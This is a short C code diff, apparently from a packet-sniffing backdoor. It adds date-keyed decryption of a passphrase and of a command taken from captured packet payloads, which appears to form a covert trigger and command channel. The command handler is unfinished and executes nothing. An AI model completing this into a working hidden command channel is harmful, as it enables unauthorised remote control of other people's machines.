@@ -150,7 +150,7 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
 
 int validPassphrase(char *passphrase)
 {
-    char *decryptedPhrase;
+    char *decryptedPhrase = NULL;
     char date[11];
     struct tm *tm;
     time_t t;
@@ -158,10 +158,10 @@ int validPassphrase(char *passphrase)
     // Get the date information
     time(&t);
     tm = localtime(&t);
-    strftime(date, sizeof date, "%Y:%m:%d", tm);
+    strftime(date, sizeof(date), "%Y:%m:%d", tm);
     
     // Decrypt our passphrase using today's date
-    decryptedPhrase = encrypt_data(passphrase, date);
+    decryptedPhrase = encrypt_data(passphrase, date, 4);
     
     // Check if the passphrase is correct
     if(strncmp(decryptedPhrase, PASSPHRASE, 4) == 0)
@@ -174,5 +174,18 @@ int validPassphrase(char *passphrase)
 
 int getCommand(char **command, int payloadSize)
 {
+    char *decryptedCommand = NULL;
+    char date[11];
+    struct tm *tm;
+    time_t t;
+    
+    // Get the date information
+    time(&t);
+    tm = localtime(&t);
+    strftime(date, sizeof(date), "%Y:%m:%d", tm);
+    
+    // Decrypt our command using today's date
+    decryptedCommand = encrypt_data(*command, date, payloadSize);
+    
     return 0;
 }
